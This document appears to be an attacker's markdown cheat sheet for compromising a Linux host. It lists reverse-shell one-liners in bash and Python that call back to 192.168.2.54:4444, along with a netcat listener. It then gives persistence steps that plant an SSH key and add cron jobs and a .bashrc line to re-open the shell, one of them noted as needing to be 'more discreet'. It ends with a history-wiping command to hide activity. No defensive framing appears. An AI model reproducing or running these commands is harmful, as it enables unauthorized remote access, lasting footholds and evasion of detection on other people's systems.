## Foothold

1. Listen for reverse shell (Attacker)

        nc -lvnp 4444


2. Serve files auxiliary files on python http server

        python3 -m http.server

3. Launch reverse shell (Victim)

        bash -i >& /dev/tcp/192.168.2.54/4444 0>&1

    Or

        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.54",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'



## Persistence 

TODO: Combine these three into one script that can be loaded with wget from the python server and executed.

1. SSH Authorized_keys 

- If authorized_keys needs to be created set the right permission, 700 for ~/.ssh and 600 for authorized_keys 

        chmod 600 ~/.ssh/authorized_keys 
        chmod 700 ~/.ssh

    And

        echo "ssh-rsa AAAAB3NzaC1yc2EAAA>----------SNIP---------<wno5DfYKqSEBQ==" >> ~/.ssh/authorized_keys 

2. Cron (Two different methods and different activation)

- Still needs testing 

        CT=$(crontab -l)
        CT=$CT$'\n10 * * * * bash -i >& /dev/tcp/192.168.2.54/4444 0>&1\n'
        printf "$CT" | crontab -

    Or

        (crontab -l ; echo "@reboot sleep 200 && bash -i >& /dev/tcp/192.168.2.54/4444 0>&1")|crontab 2> /dev/null



3. .bashrc TODO: needs tuning to be more discreet

        echo 'bash -i >& /dev/tcp/192.168.2.54/4444 0>&1 2>/dev/null &' >> ~/.bashrc





## Sneaky

1. Erase shell history 

        echo "" > ~/.bash_history



## Spooky

1. Create ghost file in home directory

    (crontab -l ; echo "* 22 * * * echo "BOO" > ~/ghost.txt\n")|crontab >/dev/null 2>&1



## Access/Capabilities




